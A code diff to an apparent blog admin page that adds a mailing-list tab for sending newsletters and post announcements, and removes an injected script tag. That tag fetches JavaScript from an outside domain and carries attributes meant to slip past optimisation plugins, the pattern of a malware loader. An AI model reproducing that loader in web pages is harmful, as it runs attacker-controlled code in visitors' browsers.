@@ -6,14 +6,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -177,6 +170,7 @@
       <button class="tab active" type="button" data-tab="posts">Posts</button>
       <button class="tab" type="button" data-tab="forum">Ask a Roamer</button>
       <button class="tab" type="button" data-tab="events">Events</button>
+      <button class="tab" type="button" data-tab="emails">Emails</button>
     </div>
 
     <!-- ========== POSTS ========== -->
@@ -279,6 +273,35 @@
       </div>
     </section>
 
+    <!-- ========== EMAILS ========== -->
+    <section id="tab-emails" class="tabpane" hidden>
+      <div class="card">
+        <h2>Send an email to the mailing list</h2>
+        <p class="sub">Write a newsletter and send it to everyone on the list (<b id="em-count">…</b> subscribers). Every email includes an unsubscribe link automatically. Send yourself a test first to see how it looks.</p>
+        <label>Subject *</label>
+        <input type="text" id="em-subject" maxlength="160" placeholder="e.g. 3 new city guides just landed">
+        <label>Message *</label>
+        <textarea id="em-body" rows="10" placeholder="Write your email here. Blank lines start a new paragraph."></textarea>
+        <div class="actions">
+          <button type="button" class="btn ghost" id="em-test">Send test to me</button>
+          <button type="button" class="btn coral" id="em-send">Send to the list</button>
+          <span class="admin-msg" id="em-msg" style="margin:0"></span>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>Settings</h2>
+        <label class="check-label"><input type="checkbox" id="em-notify"> Email me when someone new joins the mailing list</label>
+        <p class="admin-msg" id="em-notify-msg"></p>
+      </div>
+
+      <div class="card" style="padding-bottom:22px">
+        <h2>Past sends</h2>
+        <p class="sub">Every email blast that's gone out — newsletters and blog-post announcements.</p>
+        <div id="em-history"></div>
+      </div>
+    </section>
+
   </div>
 </main>
 
@@ -356,11 +379,12 @@
     const wantTab = params.get("tab");
     if (wantTab) showTab(wantTab);
     await loadEvents();
+    loadEmailsTab();
   }
 
   /* ---------- tabs ---------- */
   function showTab(name){
-    ["posts","forum","events"].forEach(t => {
+    ["posts","forum","events","emails"].forEach(t => {
       const pane = $("tab-" + t);
       if (pane) pane.hidden = (t !== name);
     });
@@ -369,6 +393,112 @@
   function initTabs(){
     document.querySelectorAll(".tab").forEach(b => b.addEventListener("click", () => showTab(b.dataset.tab)));
   }
+
+  /* ======================================================================
+     EMAILS — newsletters, blog-post blasts, subscriber-alert toggle
+     (all sending happens in netlify/functions/broadcast.js)
+     ====================================================================== */
+  async function callBroadcast(payload){
+    let token = "";
+    try{ const { data } = await sb.auth.getSession(); token = data && data.session && data.session.access_token || ""; }catch(e){}
+    const r = await fetch("/.netlify/functions/broadcast", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Authorization: "Bearer " + token },
+      body: JSON.stringify(payload)
+    });
+    const d = await r.json().catch(() => ({}));
+    return { ok: r.ok, status: r.status, d };
+  }
+
+  async function emailPost(p, btn){
+    const c = await callBroadcast({ countOnly: true });
+    const n = (c.ok && typeof c.d.count === "number") ? c.d.count : "all";
+    if (!confirm(`Email "${p.title}" to ${n} subscribers?`)) return;
+    btn.disabled = true;
+    let r = await callBroadcast({ kind: "post", slug: p.slug });
+    if (r.status === 409 && r.d.alreadySent){
+      if (confirm("This post was already emailed to the list before. Send it again anyway?")){
+        r = await callBroadcast({ kind: "post", slug: p.slug, force: true });
+      } else { btn.disabled = false; setMsg($("admin-msg"), "Not sent — it had already gone out."); return; }
+    }
+    btn.disabled = false;
+    if (r.ok && r.d.sent) setMsg($("admin-msg"), `Emailed "${p.title}" to ${r.d.count} subscribers.`);
+    else setMsg($("admin-msg"), "Couldn't send: " + (r.d.error || "unknown error"), true);
+    loadEmailHistory();
+  }
+
+  async function loadEmailsTab(){
+    // subscriber count
+    callBroadcast({ countOnly: true }).then(c => {
+      $("em-count").textContent = (c.ok && typeof c.d.count === "number") ? String(c.d.count) : "?";
+    });
+    // new-subscriber alert switch (missing row = on)
+    try{
+      const { data } = await sb.from("site_settings").select("value").eq("key", "notify_new_subscriber").maybeSingle();
+      $("em-notify").checked = !(data && String(data.value).toLowerCase() === "off");
+    }catch(e){ $("em-notify").checked = true; }
+    loadEmailHistory();
+  }
+
+  async function loadEmailHistory(){
+    const wrap = $("em-history");
+    try{
+      const { data, error } = await sb.from("email_broadcasts")
+        .select("kind,ref,subject,sent_count,created_at")
+        .order("created_at", { ascending: false }).limit(25);
+      if (error) throw error;
+      if (!data || !data.length){ wrap.innerHTML = `<div class="empty">Nothing sent yet.</div>`; return; }
+      wrap.innerHTML = data.map(b => `
+        <div class="prow">
+          <div class="info">
+            <div class="title">${esc(b.subject)}
+              <span class="chip ${b.kind === "post" ? "live" : "draft"}">${b.kind === "post" ? "Blog post" : "Newsletter"}</span>
+            </div>
+            <div class="sub">${esc(String(b.created_at || "").slice(0, 10))} · sent to ${b.sent_count} subscriber${b.sent_count === 1 ? "" : "s"}</div>
+          </div>
+        </div>`).join("");
+    }catch(e){
+      wrap.innerHTML = `<div class="empty">Couldn't load the send history — has email-workflow-setup.sql been run in Supabase?</div>`;
+    }
+  }
+
+  $("em-notify").addEventListener("change", async () => {
+    const on = $("em-notify").checked;
+    const { error } = await sb.from("site_settings")
+      .upsert({ key: "notify_new_subscriber", value: on ? "on" : "off", updated_at: new Date().toISOString() });
+    setMsg($("em-notify-msg"), error
+      ? "Couldn't save: " + (error.message || "unknown error") + " — has email-workflow-setup.sql been run?"
+      : (on ? "You'll get an email for every new subscriber." : "New-subscriber alerts are off."), !!error);
+  });
+
+  $("em-test").addEventListener("click", async () => {
+    const subject = $("em-subject").value.trim(), body = $("em-body").value.trim();
+    if (!subject || !body) return setMsg($("em-msg"), "Add a subject and a message first.", true);
+    const me = (window.NRA_AUTH.user() || {}).email;
+    if (!me) return setMsg($("em-msg"), "Couldn't find your email — sign in again.", true);
+    $("em-test").disabled = true; setMsg($("em-msg"), "Sending test…");
+    const r = await callBroadcast({ kind: "custom", subject, body, testTo: me });
+    $("em-test").disabled = false;
+    setMsg($("em-msg"), r.ok ? "Test sent — check your inbox at " + me + "." : "Test failed: " + (r.d.error || "unknown error"), !r.ok);
+  });
+
+  $("em-send").addEventListener("click", async () => {
+    const subject = $("em-subject").value.trim(), body = $("em-body").value.trim();
+    if (!subject || !body) return setMsg($("em-msg"), "Add a subject and a message first.", true);
+    const c = await callBroadcast({ countOnly: true });
+    const n = (c.ok && typeof c.d.count === "number") ? c.d.count : "all";
+    if (!confirm(`Send "${subject}" to ${n} subscribers? This can't be undone.`)) return;
+    $("em-send").disabled = true; setMsg($("em-msg"), "Sending…");
+    const r = await callBroadcast({ kind: "custom", subject, body });
+    $("em-send").disabled = false;
+    if (r.ok && r.d.sent){
+      setMsg($("em-msg"), `Sent to ${r.d.count} subscribers.`);
+      $("em-subject").value = ""; $("em-body").value = "";
+      loadEmailHistory();
+    } else {
+      setMsg($("em-msg"), "Couldn't send: " + (r.d.error || r.d.reason || "unknown error"), true);
+    }
+  });
 
   /* ======================================================================
      POSTS — database articles + built-in posts.js
@@ -408,6 +538,7 @@
         </div>
         <div class="acts">
           ${p.published ? `<a class="btn small ghost" target="_blank" href="post.html?post=${encodeURIComponent(p.slug)}">View</a>` : ""}
+          ${p.published ? `<button class="btn small ghost" data-act="email" type="button">Email subscribers</button>` : ""}
           <a class="btn small" href="blog-editor.html?id=${encodeURIComponent(p.id)}">Edit</a>
           <button class="btn small ghost" data-act="toggle" type="button">${p.published ? "Unpublish" : "Publish"}</button>
           <button class="btn small danger" data-act="del" type="button">Delete</button>
@@ -426,6 +557,7 @@
       setMsg($("admin-msg"), p.published ? `"${p.title}" is now a draft (hidden from the site).` : `"${p.title}" is now live.`);
       await loadRows();
     }
+    if (btn.dataset.act === "email"){ await emailPost(p, btn); }
     if (btn.dataset.act === "del"){
       if (btn.dataset.armed !== "1"){
         btn.dataset.armed = "1"; btn.textContent = "Really delete?";
